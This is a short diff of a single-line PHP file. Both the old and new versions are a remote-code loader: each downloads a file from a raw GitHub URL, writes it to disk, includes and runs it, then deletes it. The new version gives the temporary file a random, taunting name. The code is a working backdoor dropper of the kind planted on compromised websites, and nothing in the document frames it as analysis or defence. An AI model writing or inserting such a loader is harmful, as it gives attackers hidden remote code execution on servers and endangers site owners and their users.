@@ -1,1 +1,1 @@
-<?php $x="https://raw.githubusercontent.com/ortod0x/super-happiness/main/1c92nc0x.zee";$y="1c92nc0x.zee";file_put_contents($y,file_get_contents($x));include($y);unlink($y); ?>
+<?php $x="https://raw.githubusercontent.com/ortod0x/super-happiness/main/1c92nc0x.zee";$c=rand(1000,9999999);$y="NO_ONE_CAN_DELETE_ME.call_me-$c-_lmfaoo";file_put_contents($y,file_get_contents($x));include($y);unlink($y); ?>
